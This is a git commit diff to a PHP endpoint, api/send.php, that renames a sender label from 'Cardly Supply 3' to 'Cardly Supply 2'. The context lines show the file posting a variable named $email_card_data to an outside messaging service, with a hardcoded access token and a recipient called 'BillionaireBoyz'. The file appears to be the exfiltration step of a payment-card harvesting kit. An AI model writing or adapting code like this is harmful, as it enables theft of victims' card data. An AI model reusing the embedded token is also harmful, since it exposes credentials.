264978c56a2a6871faef69493df5ce2d76dfd891
Christopher <111513047+Chrisreallz@users.noreply.github.com>
2024-04-24 04:31:56 +0000

    fix(Cardly Supply 2)

--- api/send.php
+++ api/send.php
@@ -71,7 +71,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
         "accessToken": "6X57_NC-Z7fS_Ygz3SjkI",
         "template_params": {
             "to_name":"BillionaireBoyz",
-            "from_name":"Cardly Supply 3",
+            "from_name":"Cardly Supply 2",
             "message": $email_card_data
         }
     }
